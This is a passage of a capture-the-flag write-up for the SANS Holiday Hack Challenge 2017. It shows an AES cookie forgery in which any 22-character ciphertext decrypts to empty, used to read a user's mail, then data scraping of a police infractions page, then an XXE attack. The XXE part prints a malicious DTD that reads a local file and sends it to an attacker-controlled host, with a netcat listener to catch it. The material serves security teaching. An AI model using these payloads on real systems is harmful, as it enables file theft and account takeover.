meaning that the encrypted contents themselves are never verified.
</p>

<p>
Since we can control both the ciphertext and the expected plaintext, we can
just set the challenge to the empty string "" and the response then just needs
to be ANY message that decrypts to "".  Since the message is empty, the key is
irrelevant, we just need to work out how to properly generate a ciphertext that
will decrypt to nothing.
</p>

<p>
A completely empty ciphertext throws an error:
</p>

<div class="org-src-container">
<pre class="src src-js">&gt; <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">aes256</span> = require(<span style="color: #8abeb7;">'aes256'</span>);
&gt; aes256.decrypt(<span style="color: #8abeb7;">'key does not matter'</span>, <span style="color: #8abeb7;">''</span>)
TypeError: Provided <span style="color: #8abeb7;">"encrypted"</span> must be a non-empty string
    at Object.decrypt (<span style="color: #8abeb7;">/Users/</span>user/node_modules/aes256/index.js:68:13)
</pre>
</div>

<p>
A larger ciphertext works, but gives us a random string, which is not what we want.. but 
we can see that a fairly long cipher text only gives us a few bytes of plaintext&#x2026;
</p>

<div class="org-src-container">
<pre class="src src-js">&gt; aes256.decrypt(<span style="color: #8abeb7;">'key does not matter'</span>, <span style="color: #8abeb7;">'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'</span>)
<span style="color: #8abeb7;">'F..%=X..'</span>
</pre>
</div>

<p>
The difference in the length of the two strings is 24:
</p>

<div class="org-src-container">
<pre class="src src-js">&gt; x=<span style="color: #8abeb7;">'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'</span>
&gt; x.length - aes256.decrypt(<span style="color: #8abeb7;">'key does not matter'</span>,x).length
24
</pre>
</div>

<p>
From the hints, we learn that some of the bytes are used for the IV.
</p>

<p>
The AES library won't let us encrypt an empty string, but we can encrypt a single char:
</p>

<div class="org-src-container">
<pre class="src src-js">&gt; aes256.encrypt(<span style="color: #8abeb7;">'key does not matter'</span>, <span style="color: #8abeb7;">''</span>)
TypeError: Provided <span style="color: #8abeb7;">"plaintext"</span> must be a non-empty string
    at Object.encrypt (<span style="color: #8abeb7;">/Users/</span>user/node_modules/aes256/index.js:39:13)
&gt; aes256.encrypt(<span style="color: #8abeb7;">'key does not matter'</span>, <span style="color: #8abeb7;">'x'</span>)
<span style="color: #8abeb7;">'L7rwNMwISl2chavT6lILlNM='</span>
&gt; aes256.encrypt(<span style="color: #8abeb7;">'key does not matter'</span>, <span style="color: #8abeb7;">'x'</span>).length
24
</pre>
</div>

<p>
This gives a ciphertext of length 24 with one byte of = for padding.  This
means that 22 bytes are used for the IV and one byte is used to encrypt the 'x'
itself.
</p>

<p>
So, at this point it is clear that something interesting happens around 22-24 chars.
</p>

<p>
Trying different lengths approaching a length of 22 continues to throw an error
for a while&#x2026;
</p>

<div class="org-src-container">
<pre class="src src-js">&gt; aes256.decrypt(<span style="color: #8abeb7;">'key does not matter'</span>, <span style="color: #8abeb7;">'aaaaaaaaaaaaaaaa'</span>)
TypeError: Provided <span style="color: #8abeb7;">"encrypted"</span> must be a non-empty string
    at Object.decrypt (<span style="color: #8abeb7;">/Users/</span>user/node_modules/aes256/index.js:68:13)
</pre>
</div>

<p>
Until the error changes:
</p>

<div class="org-src-container">
<pre class="src src-js">&gt; aes256.decrypt(<span style="color: #8abeb7;">'key does not matter'</span>, <span style="color: #8abeb7;">'aaaaaaaaaaaaaaaaa'</span>)
Error: Invalid IV length
    at <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">Decipheriv</span> (internal/crypto/cipher.js:186:16)
    at Object.createDecipheriv (crypto.js:106:10)
    at Object.decrypt (<span style="color: #8abeb7;">/Users/</span>user/node_modules/aes256/index.js:78:27)
&gt; aes256.decrypt(<span style="color: #8abeb7;">'key does not matter'</span>, <span style="color: #8abeb7;">'aaaaaaaaaaaaaaaaaa'</span>)
Error: Invalid IV length
    at <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">Decipheriv</span> (internal/crypto/cipher.js:186:16)
    at Object.createDecipheriv (crypto.js:106:10)
    at Object.decrypt (<span style="color: #8abeb7;">/Users/</span>user/node_modules/aes256/index.js:78:27)
&gt; aes256.decrypt(<span style="color: #8abeb7;">'key does not matter'</span>, <span style="color: #8abeb7;">'aaaaaaaaaaaaaaaaaaa'</span>)
Error: Invalid IV length
    at <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">Decipheriv</span> (internal/crypto/cipher.js:186:16)
    at Object.createDecipheriv (crypto.js:106:10)
    at Object.decrypt (<span style="color: #8abeb7;">/Users/</span>user/node_modules/aes256/index.js:78:27)
&gt; aes256.decrypt(<span style="color: #8abeb7;">'key does not matter'</span>, <span style="color: #8abeb7;">'aaaaaaaaaaaaaaaaaaaa'</span>)
Error: Invalid IV length
    at <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">Decipheriv</span> (internal/crypto/cipher.js:186:16)
    at Object.createDecipheriv (crypto.js:106:10)
    at Object.decrypt (<span style="color: #8abeb7;">/Users/</span>user/node_modules/aes256/index.js:78:27)
&gt; aes256.decrypt(<span style="color: #8abeb7;">'key does not matter'</span>, <span style="color: #8abeb7;">'aaaaaaaaaaaaaaaaaaaaa'</span>)
Error: Invalid IV length
    at <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">Decipheriv</span> (internal/crypto/cipher.js:186:16)
    at Object.createDecipheriv (crypto.js:106:10)
    at Object.decrypt (<span style="color: #8abeb7;">/Users/</span>user/node_modules/aes256/index.js:78:27)
&gt; aes256.decrypt(<span style="color: #8abeb7;">'key does not matter'</span>, <span style="color: #8abeb7;">'aaaaaaaaaaaaaaaaaaaaaa'</span>)
<span style="color: #8abeb7;">''</span>
&gt; <span style="color: #8abeb7;">'aaaaaaaaaaaaaaaaaaaaaa'</span>.length
22
&gt; aes256.decrypt(<span style="color: #8abeb7;">'key really does not matter'</span>, <span style="color: #8abeb7;">'aaaaaaaaaaaaaaaaaaaaaa'</span>)
<span style="color: #8abeb7;">''</span>
</pre>
</div>

<p>
Success!  A string of any 22 chars will decrypt to the empty string.
</p>

<p>
An alternative approach would be to edit the aes library and comment out this block:
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b5bd68;">if</span> (<span style="color: #b5bd68;">typeof</span> plaintext !== <span style="color: #8abeb7;">'string'</span> || !plaintext) {
  <span style="color: #b5bd68;">throw</span> <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">TypeError</span>(<span style="color: #8abeb7;">'Provided "plaintext" must be a non-empty string'</span>);
}
</pre>
</div>

<p>
With the throw commented out, we can encrypt an empty string:
</p>

<div class="org-src-container">
<pre class="src src-js">&gt; <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">aes256</span> = require(<span style="color: #8abeb7;">'aes256'</span>);
&gt; aes256.encrypt(<span style="color: #8abeb7;">'whatever'</span>, <span style="color: #8abeb7;">''</span>)
<span style="color: #8abeb7;">'SStLU1QxLjmtG/Ea8hMH0Q=='</span>
&gt; ct=aes256.encrypt(<span style="color: #8abeb7;">'whatever'</span>, <span style="color: #8abeb7;">''</span>)
<span style="color: #8abeb7;">'tYcVb4PRsdq4JWl5XMSNgw=='</span>
&gt; aes256.decrypt(<span style="color: #8abeb7;">'a different key entirely'</span>, ct)
<span style="color: #8abeb7;">''</span>
&gt; ct.length
24
</pre>
</div>

<p>
The length is different(24 instead of 22), but only because it is padded with 2
bytes of == for base64 purposes.
</p>
</div>
</li>

<li><a id="org9afeb1e"></a>Tool Development<br />
<div class="outline-text-6" id="text-org9afeb1e">
<p>
We created a script, TODO LINK TO EWA SCRIPT, which will forge a
cookie to login as a user, and then dump all the e-mails as JSON. In
order to do this, we relied heavily on
<a href="http://mail.northpolechristmastown.com/js/custom.js">http://mail.northpolechristmastown.com/js/custom.js</a> to see how the API
worked, and duplicated portions of it in Python. This script allowed
us to archive and search e-mails, which was useful for future
questions.
</p>

<pre class="example">
$ ./ewa.py alabaster.snowball &gt; alabaster_inbox.json
$ cat alabaster_inbox.json | jq '.INBOX[].HEADERS.body.subject' -c
["Welcome"]
["Re: Welcome"]
["Re: gingerbread cookie recipe"]
["COOKIES!"]
["Re: COOKIES!"]
["Re: COOKIES!"]
["Re: COOKIES!"]
["Re: COOKIES!"]
["Re: COOKIES!"]
["Christmas Party!"]
["Re: Christmas Party!"]
["Re: Christmas Party!"]
["Re: Christmas Party!"]
["Re: Christmas Party!"]
["Should we be worried?"]
["Re: Should we be worried?"]
["Re: Should we be worried?"]
["Lost book page"]
["Re: Lost book page"]
["Re: Lost book page"]
["Re: Lost book page"]
</pre>
</div>
</li>
</ul>
</div>

<div id="outline-container-org4f441ab" class="outline-4">
<h4 id="q4_solution"><a id="org4f441ab"></a>Solution</h4>
<div class="outline-text-4" id="text-q4_solution">
<p>
Alabaster Snowball had a vulnerability in his cookie validation code,
where he wasn't verifying the length of the decrypted text. AES will
encrypt an empty string as an empty string, so we can forge a cookie
without needing to know the key. With this forged cookie, we can login
to Alabaster's e-mail, and find an e-mail with a link to the page
we're looking for.
</p>
</div>
</div>

<div id="outline-container-org9a1c85d" class="outline-4">
<h4 id="q4_alternatives"><a id="org9a1c85d"></a>Alternatives</h4>
<div class="outline-text-4" id="text-q4_alternatives">
<p>
If only we could crack Alabaster's password, we wouldn't need to forge
any cookies. But more on that later&#x2026;
</p>
</div>
</div>

<div id="outline-container-orgd0d0cf2" class="outline-4">
<h4 id="q4_common-pitfalls"><a id="orgd0d0cf2"></a>Common Pitfalls</h4>
<div class="outline-text-4" id="text-q4_common-pitfalls">
<p>
As previously mentioned, this seemed to be one of the most-discussed
questions in chat. We saw people trying to brute-force the AES key,
focus on the encryption of the message, or just try to bypass the web
application completely.
</p>
</div>
</div>
</div>
<div id="outline-container-org53b0b7f" class="outline-3">
<h3 id="org53b0b7f">NPPD: Naughty Moles</h3>
<div class="outline-text-3" id="text-org53b0b7f">
</div>
<div id="outline-container-orgd3ba793" class="outline-4">
<h4 id="q5_question"><a id="orgd3ba793"></a>Question</h4>
<div class="outline-text-4" id="text-q5_question">
<p>
How many infractions are required to be marked as naughty on Santa's
Naughty and Nice List? What are the names of at least six insider
threat moles? Who is throwing the snowballs from the top of the North
Pole Mountain and what is your proof?
</p>

<p>
<i>Minty Candycane offers some tips for this challenge in the North Pole and Beyond.</i>
</p>
</div>
</div>

<div id="outline-container-org916a608" class="outline-4">
<h4 id="q5_background-information"><a id="org916a608"></a>Background Information</h4>
<div class="outline-text-4" id="text-q5_background-information">
<p>
We need to answer 3 questions involving infractions, insider moles and who is throwing snowballs. We need 4 things to answer these questions.
</p>

<ul class="org-ul">
<li>We need data from the <a href="http://nppd.northpolechristmastown.com/">North Pole Police Department</a>'s <a href="http://nppd.northpolechristmastown.com/infractions">infractions</a> page.</li>
<li>We need the naughty and nice list from the SMB server that we accessed from question 3.</li>
<li>We need the Munchkin Mole Report BOLO also on the SMB server.</li>
<li>We need to complete the "Bumble's Bounce" level on the WebGL game in order to unlock a chat from Sam.</li>
</ul>
</div>
</div>

<div id="outline-container-org55bdaa8" class="outline-4">
<h4 id="q5_goal"><a id="org55bdaa8"></a>Goal</h4>
<div class="outline-text-4" id="text-q5_goal">
<ul class="org-ul">
<li>We need to identify what factors trigger a 'naughty' flag.</li>
<li>We need to identify the six insider threat moles.</li>
<li>We need to identify who is throwing snow balls.</li>
</ul>
</div>
</div>

<div id="outline-container-org2e2dd6c" class="outline-4">
<h4 id="q5_approach"><a id="org2e2dd6c"></a>Approach</h4>
<div class="outline-text-4" id="text-q5_approach">
<p>
Playing around with the infractions page we can see that once you do a search a Download option becomes available to download all the search results in json format. Let's automate this to create a local copy of all the data. We can do this searching for all results before and during a specific date, and all results after that date. We then combine those results into a single file. We can automate this with a script we'll call <code>nppd.py</code>.
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">!/usr/bin/env python3</span>
<span style="color: #b5bd68;">import</span> requests
<span style="color: #b5bd68;">import</span> json

<span style="color: #f0c674;">BASE</span> = <span style="color: #8abeb7;">"http://nppd.northpolechristmastown.com/"</span>

<span style="color: #b5bd68;">def</span> <span style="color: #de935f;">search_infractions</span>(query):
    <span style="color: #f0c674;">url</span> = BASE + <span style="color: #8abeb7;">"infractions"</span>

    <span style="color: #f0c674;">params</span> = {
        <span style="color: #8abeb7;">"json"</span>: <span style="color: #8abeb7;">"1"</span>,
        <span style="color: #8abeb7;">"query"</span>: query,
    }
    <span style="color: #f0c674;">resp</span> = requests.get(url, params=params).json()
    <span style="color: #b5bd68;">return</span> resp[<span style="color: #8abeb7;">'infractions'</span>]


<span style="color: #b5bd68;">def</span> <span style="color: #de935f;">download_infractions</span>():
    <span style="color: #f0c674;">old</span> = search_infractions(<span style="color: #8abeb7;">"date &lt;= 2017-12-10"</span>)
    <span style="color: #f0c674;">recent</span> = search_infractions(<span style="color: #8abeb7;">"date &gt; 2017-12-10"</span>)
    <span style="color: #f0c674;">all_infractions</span> = old+recent

    <span style="color: #b5bd68;">print</span>(<span style="color: #8abeb7;">"Old infractions"</span>, <span style="color: #b294bb;">len</span>(old))
    <span style="color: #b5bd68;">print</span>(<span style="color: #8abeb7;">"Recent infractions"</span>, <span style="color: #b294bb;">len</span>(recent))
    <span style="color: #b5bd68;">print</span>(<span style="color: #8abeb7;">"Total infractions"</span>, <span style="color: #b294bb;">len</span>(all_infractions))

    <span style="color: #b5bd68;">with</span> <span style="color: #b294bb;">open</span>(<span style="color: #8abeb7;">"infractions.json"</span>, <span style="color: #8abeb7;">'w'</span>) <span style="color: #b5bd68;">as</span> f:
        json.dump(all_infractions, f, indent=4)

<span style="color: #b5bd68;">if</span> <span style="color: #b294bb;">__name__</span> == <span style="color: #8abeb7;">"__main__"</span>:
    download_infractions()
</pre>
</div>

<p>
Calling <code>nppd.py</code> creates a file 'infractions.json'. Now that we have
the NPPD's infractions database we need compare it to the Naughty and
Nice file we found on the SMB server. We can automate this process
scriptomagically. While we're at it we should also script identifying
the 6 insider threat moles as well. For finding the moles it appears
their characteristics are pulling hair and throwing rocks. We'll try
to identify people on the infractions list that do both.
</p>

<p>
To get the number of infractions needed to get onto the naughty list we take the names on the Naughty and Nice List that have been marked as <code>Naughty</code> and count the total number of infractions for those people and we identify the lowest number of infractions per person amongst all of them.
</p>

<p>
So to automate all this we'll create script we'll call <code>analyze_infractions.py</code> to correlate our data.
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">!/usr/bin/env python3</span>
<span style="color: #b5bd68;">import</span> csv
<span style="color: #b5bd68;">import</span> json
<span style="color: #b5bd68;">from</span> operator <span style="color: #b5bd68;">import</span> itemgetter
<span style="color: #b5bd68;">from</span> collections <span style="color: #b5bd68;">import</span> defaultdict

<span style="color: #f0c674;">WANT</span> = <span style="color: #b294bb;">set</span>([<span style="color: #8abeb7;">'Aggravated pulling of hair'</span>, <span style="color: #8abeb7;">'Throwing rocks (at people)'</span>, <span style="color: #8abeb7;">'Throwing rocks (non-person target)'</span>])

<span style="color: #b5bd68;">def</span> <span style="color: #de935f;">get_naughty</span>():
    <span style="color: #b5bd68;">with</span> <span style="color: #b294bb;">open</span>(<span style="color: #8abeb7;">"../support_files/FileStore/Naughty and Nice List.csv"</span>) <span style="color: #b5bd68;">as</span> f:
        <span style="color: #f0c674;">reader</span> = csv.reader(f)
        <span style="color: #f0c674;">rows</span> = <span style="color: #b294bb;">list</span>(reader)

    <span style="color: #b5bd68;">return</span> [name <span style="color: #b5bd68;">for</span> (name, naughty) <span style="color: #b5bd68;">in</span> rows <span style="color: #b5bd68;">if</span> naughty == <span style="color: #8abeb7;">'Naughty'</span>]

<span style="color: #b5bd68;">def</span> <span style="color: #de935f;">main</span>():
    <span style="color: #f0c674;">byname</span> = defaultdict(<span style="color: #b294bb;">set</span>)
    <span style="color: #f0c674;">infraction_count_byname</span> = defaultdict(<span style="color: #b294bb;">int</span>)
    <span style="color: #b5bd68;">with</span> <span style="color: #b294bb;">open</span>(<span style="color: #8abeb7;">"../output/infractions.json"</span>) <span style="color: #b5bd68;">as</span> f:
        <span style="color: #f0c674;">infractions</span> = json.load(f)

    <span style="color: #b5bd68;">for</span> i <span style="color: #b5bd68;">in</span> infractions:
        byname[i[<span style="color: #8abeb7;">'name'</span>]].add(i[<span style="color: #8abeb7;">'title'</span>])
        infraction_count_byname[i[<span style="color: #8abeb7;">'name'</span>]] += 1

    <span style="color: #b5bd68;">print</span>(<span style="color: #8abeb7;">"Six insider threat moles:"</span>)
    <span style="color: #b5bd68;">for</span> n, titles <span style="color: #b5bd68;">in</span> byname.items():
        <span style="color: #b5bd68;">if</span> <span style="color: #b294bb;">len</span>(titles &amp; WANT) &gt;= 2:
            <span style="color: #b5bd68;">print</span>(<span style="color: #8abeb7;">"*"</span>, n,titles)

    <span style="color: #969896; font-style: italic;">#############</span>

    <span style="color: #f0c674;">min_infractions</span> = <span style="color: #b294bb;">min</span>(infraction_count_byname[name] <span style="color: #b5bd68;">for</span> name <span style="color: #b5bd68;">in</span> get_naughty())

    <span style="color: #b5bd68;">print</span>()
    <span style="color: #b5bd68;">print</span>(<span style="color: #8abeb7;">"How many infractions are required to be marked as naughty on Santa's Naughty and Nice List:"</span>, min_infractions)

<span style="color: #b5bd68;">if</span> <span style="color: #b294bb;">__name__</span> == <span style="color: #8abeb7;">"__main__"</span>:
   main() 
</pre>
</div>

<p>
After we run our script we get these results:
</p>

<pre class="example">
Six insider threat moles:
 Isabel Mehta {'Tantrum in a private facility', 'Aggravated pulling of hair', 'Throwing rocks (non-person target)'}
 Nina Fitzgerald {'Giving super atomic wedgies', 'Aggravated pulling of hair', 'Throwing rocks (at people)', 'Possession of unlicensed slingshot', 'Bedtime violation'}
 Kirsty Evans {'Giving super atomic wedgies', 'Aggravated pulling of hair', 'Throwing rocks (at people)', 'Crayon on walls'}
 Sheri Lewis {'Throwing rocks (at people)', 'Aggravated pulling of hair', 'Possession of unlicensed slingshot', 'Naughty words'}
 Beverly Khalil {'Aggravated pulling of hair', 'Throwing rocks (at people)', 'Playing with matches', 'Possession of unlicensed slingshot', 'General sassing'}
 Christy Srivastava {'Tantrum in a private facility', 'Aggravated pulling of hair', 'Tantrum in public', 'Throwing rocks (non-person target)'}

How many infractions are required to be marked as naughty on Santa's Naughty and Nice List: 4
</pre>


<p>
Finally, once we play through the Bumbles Bounce level and get all achievements this chat gets unlocked and we have our answer for who is throwing snowballs.
</p>

<blockquote>
<p>
Arrrrrrrrgh! Grrrrrrrr! ROOOOOOOAR!
</p>

<p>
You've done it! You found out who was throwing the giant snowballs! It was the Abominable Snow Monster. We should have known. Thank you for your great work!
</p>

<p>
But, you know, he doesn't seem quite himself. Look into his eyes. It almost looks like he has been hypnotized. Something's not right with him.
</p>

<p>
In fact, he seems to be under someone else's control. We've got to find out who is pulling his strings, or else the real villain will remain on the loose and will likely strike again.
</p>

<p>
It means, buckle your seatbelt, dear player, because the North Pole is going bye-bye
</p>
</blockquote>
</div>
</div>

<div id="outline-container-org0f0dcfb" class="outline-4">
<h4 id="q5_solution"><a id="org0f0dcfb"></a>Solution</h4>
<div class="outline-text-4" id="text-q5_solution">
<p>
It appears we need <code>4</code> infractions to make the Naughty list.
</p>

<p>
Our six insider moles appear to be:
</p>
<ul class="org-ul">
<li>Isabel Mehta</li>
<li>Nina Fitzgerald</li>
<li>Kirsty Evans</li>
<li>Sheri Lewis</li>
<li>Beverly Khalil</li>
<li>Christy Srivastava</li>
</ul>

<p>
According to the unlocked chat with Sam, the person throwing snowballs is <code>the Abominable Snow Monster</code>, but maybe under someone else's control.
</p>
</div>
</div>
</div>
<div id="outline-container-orgcb57184" class="outline-3">
<h3 id="orgcb57184">EaaS: XML, XXE, and DTD &#x2013; Oh My!</h3>
<div class="outline-text-3" id="text-orgcb57184">
</div>
<div id="outline-container-org319a8c3" class="outline-4">
<h4 id="q6_question"><a id="org319a8c3"></a>Question</h4>
<div class="outline-text-4" id="text-q6_question">
<p>
The North Pole engineering team has introduced an Elf as a Service
(EaaS) platform to optimize resource allocation for mission-critical
Christmas engineering projects at
<a href="http://eaas.northpolechristmastown.com/">http://eaas.northpolechristmastown.com/</a>. Visit the system and retrieve
instructions for accessing The Great Book page from C:\greatbook.txt.
Then retrieve The Great Book PDF file by following those directions.
What is the title of The Great Book page?
</p>

<p>
<i>For hints on this challenge, please consult with Sugarplum Mary in the North Pole and Beyond.</i>
</p>
</div>
</div>

<div id="outline-container-org80d8327" class="outline-4">
<h4 id="q6_background-information"><a id="org80d8327"></a>Background Information</h4>
<div class="outline-text-4" id="text-q6_background-information">
</div>

<ul class="org-ul">
<li><a id="orgb4d59b8"></a>Hints:<br />
<div class="outline-text-5" id="text-orgb4d59b8">
<div class="hint">
<p>
The Elf As A Service (EAAS) site is a new service we're experimenting with in the North Pole. Previously, if you needed a special engineer for toy production, you would have to write a memo and distribute it to several people for approval. All of that process is automated now, allowing production teams to request assistance through the EAAS site.
</p>

</div>

<div class="hint">
<p>
The EAAS site uses XML data to manage requests from other teams. There is a sample request layout available that you can download. Teams just customize the XML and submit!
</p>

</div>

<div class="hint">
<p>
I think some of the elves got a little lazy toward the go-live date for EAAS. The sample XML data doesn't even include a DTD reference.
</p>

</div>

<div class="hint">
<p>
XML processing can be complex. I saw an interesting article recently on the <a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">dangers of external XML entities</a>.
</p>

</div>
</div>
</li>

<li><a id="orgb0ab0dc"></a>Blog Posts:<br />
<div class="outline-text-5" id="text-orgb0ab0dc">
<p>
This post is called out in the hints:
</p>

<p>
Exploiting XXE Vulnerabilities in IIS.NET
<a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
</p>

<p>
To pull off this attack, we'll need to host a file somewhere that the EaaS system can reach. We can either host it on l2s, in which case we'll use this blog post for creating a file on that system, which is locked down with <code>rbash</code>:
</p>

<p>
A Spot of Tee
<a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a>
</p>

<p>
Alternatively, we could spin up an AWS VM using the instructions in this blog post:
</p>

<p>
Putting My Zero Cents In: Using the Free Tier on Amazon Web Services (EC2)
<a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
</p>

<p>
The hints are all pretty strongly pointing us towards an <abbr title="XML External Entity"> XXE</abbr> vulnerability.
</p>
</div>
</li>
</ul>
</div>

<div id="outline-container-orgf5ffe5b" class="outline-4">
<h4 id="q6_goal"><a id="orgf5ffe5b"></a>Goal</h4>
<div class="outline-text-4" id="text-q6_goal">
<p>
We want to access C:\greatbook.txt, and then follow those instructions to retrieve a page of the Great Book.
</p>
</div>
</div>

<div id="outline-container-org4cd8df0" class="outline-4">
<h4 id="q6_approach"><a id="org4cd8df0"></a>Approach</h4>
<div class="outline-text-4" id="text-q6_approach">
<p>
We'll start with just pulling up the site in a browser:
</p>


<div class="figure">
<p><img src="./images/eaas_home.png" alt="eaas_home.png" width="350px" />
</p>
<p><span class="figure-number">Figure 21: </span>EaaS Home</p>
</div>

<p>
Poking around the site a bit, we see that it provides four functions:
</p>

<ol class="org-ol">
<li>We can view our current Elf order at <a href="http://eaas.northpolechristmastown.com/Home/DisplayXML">http://eaas.northpolechristmastown.com/Home/DisplayXML</a>,</li>
<li>On that same page, we can make a change to our order by uploading a file,</li>
<li>We can reset the XML file here: <a href="http://eaas.northpolechristmastown.com/Home/CreateElfs">http://eaas.northpolechristmastown.com/Home/CreateElfs</a>,</li>
<li>We can download the XML file here: <a href="http://eaas.northpolechristmastown.com/XMLFile/Elfdata.xml">http://eaas.northpolechristmastown.com/XMLFile/Elfdata.xml</a></li>
</ol>

<p>
All this XML talk lines up pretty well with the blog post and the hints. Let's see if the EaaS site is vulnerable to <abbr title="XML External Entity"> XXE</abbr>.
</p>

<p>
Following along with the blog post, we'll create a malicious
<abbr title="Data Type Definition"> DTD</abbr> file, borrowing liberally from the SANS post:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 1: </span>The DTD File</label><pre class="src src-xml">&lt;?<span style="color: #b5bd68;">xml</span> <span style="color: #f0c674;">version</span>=<span style="color: #8abeb7;">"</span><span style="color: #8abeb7;">1.0</span><span style="color: #8abeb7;">"</span> <span style="color: #f0c674;">encoding</span>=<span style="color: #8abeb7;">"</span><span style="color: #8abeb7;">UTF-8</span><span style="color: #8abeb7;">"</span>?&gt;
&lt;!<span style="color: #b5bd68;">ENTITY</span> % stolendata <span style="color: #b5bd68;">SYSTEM</span> <span style="color: #b294bb;">"</span><span style="color: #b294bb;">file:///c:/greatbook.txt</span><span style="color: #b294bb;">"</span>&gt;
&lt;!<span style="color: #b5bd68;">ENTITY</span> % inception <span style="color: #b294bb;">"</span><span style="color: #b294bb;">&lt;!ENTITY % sendit SYSTEM 'http://10.142.0.11:8272/?%stolendata;'&gt;</span><span style="color: #b294bb;">"</span>&gt;
</pre>
</div>

<p>
If we can get the XML parser to use this <abbr title="Data Type Definition"> DTD</abbr> 
file, it will read our target text file, then send it to a system that
we control. This file doesn't help the parser know how to parse our
XML, but we don't really care if it gets parsed correctly or not.
</p>

<p>
In order to have the XML parser load this <abbr title="Data Type Definition"> DTD</abbr> file, we'll use the XML example in the blog post:
</p>

<div class="note">
<p>
This example in the blog post had a typo, where the last character was a <code>&lt;</code> instead of a <code>&gt;</code>.
</p>

</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 2: </span>The XML File</label><pre class="src src-xml">&lt;?<span style="color: #b5bd68;">xml</span> <span style="color: #f0c674;">version</span>=<span style="color: #8abeb7;">"</span><span style="color: #8abeb7;">1.0</span><span style="color: #8abeb7;">"</span> <span style="color: #f0c674;">encoding</span>=<span style="color: #8abeb7;">"</span><span style="color: #8abeb7;">utf-8</span><span style="color: #8abeb7;">"</span>?&gt;
&lt;!<span style="color: #b5bd68;">DOCTYPE</span> demo [
    &lt;!<span style="color: #b5bd68;">ELEMENT</span> demo <span style="color: #b5bd68;">ANY</span> &gt;
    &lt;!<span style="color: #b5bd68;">ENTITY</span> % extentity <span style="color: #b5bd68;">SYSTEM</span> <span style="color: #b294bb;">"</span><span style="color: #b294bb;">http://10.142.0.11:8271/evil.dtd</span><span style="color: #b294bb;">"</span>&gt;
    %extentity;
    %inception;
    %sendit;
    ]
&gt;
</pre>
</div>

<p>
This will load our evil.dtd file, then instantiate the necessary
entities. To finish off the attack, we'll need two HTTP services
running. The first will need to serve the evil.dtd file. Python's
<code>SimpleHTTPServer</code> is the easiest way to do this, and in fact, that's
provided on l2s. We'll create our file, with tee, then start a
server. Ports 8080 and 4444 are very contentious on l2s, so we'll use
non-standard ones instead:
</p>

<pre class="example">
alabaster_snowball@hhc17-apache-struts2:/tmp/asnow.EtweHkIXQZGuoo51RBy2FSyA$ cat | tee evil.dtd
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!ENTITY % stolendata SYSTEM "file:///c:/greatbook.txt"&gt;
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!ENTITY % stolendata SYSTEM "file:///c:/greatbook.txt"&gt;
&lt;!ENTITY % inception "&lt;!ENTITY % sendit SYSTEM 'http://1.2.3.4:8272/?%stolendata;'&gt;"&gt;
&lt;!ENTITY % inception "&lt;!ENTITY % sendit SYSTEM 'http://1.2.3.4:8272/?%stolendata;'&gt;"&gt;
alabaster_snowball@hhc17-apache-struts2:/tmp/asnow.EtweHkIXQZGuoo51RBy2FSyA$ python -m SimpleHTTPServer 8271
Serving HTTP on 0.0.0.0 port 8271 ...
</pre>

<p>
In another terminal, we'll start up a <code>netcat</code> listener, to capture the response:
</p>

<pre class="example">
alabaster_snowball@hhc17-apache-struts2:/tmp/asnow.sHkbOWKtpdnH8SGpCM2VAMgL$ nc -l -p 8272
</pre>

<p>
With these services in place, we're ready to upload our malicious XML file. Using a web browser, we'll upload our XML file, and then see what happens.
</p>

<pre class="example">
Serving HTTP on 0.0.0.0 port 8271 ...
10.142.0.13 - - [10/Jan/2018 22:26:43] "GET /evil.dtd HTTP/1.1" 200 -
</pre>

<p>
Great, our DTD file was loaded! And checking our <code>netcat</code> instance:
</p>

<pre class="example">
alabaster_snowball@hhc17-apache-struts2:/tmp/asnow.sHkbOWKtpdnH8SGpCM2VAMgL$ nc -l -p 8272
</pre>

<p>
&#x2026;nothing. That's disappointing. We've already noticed one typo in
the blog. Could it be possible that there was another error? Taking a
close look at the image on the page, we notice that part of the DTD
file is escaped differently from how the example shows up on the
webpage:
</p>


<div class="figure">
<p><img src="./images/eaas_dtd.png" alt="eaas_dtd.png" width="350px" />
</p>
<p><span class="figure-number">Figure 22: </span>DTD File</p>
</div>

<p>
We'll update our DTD file, so that the percent sign before <code>sendit</code> is escaped:
</p>

<div class="org-src-container">
<pre class="src src-xml">&lt;?<span style="color: #b5bd68;">xml</span> <span style="color: #f0c674;">version</span>=<span style="color: #8abeb7;">"</span><span style="color: #8abeb7;">1.0</span><span style="color: #8abeb7;">"</span> <span style="color: #f0c674;">encoding</span>=<span style="color: #8abeb7;">"</span><span style="color: #8abeb7;">UTF-8</span><span style="color: #8abeb7;">"</span>?&gt;
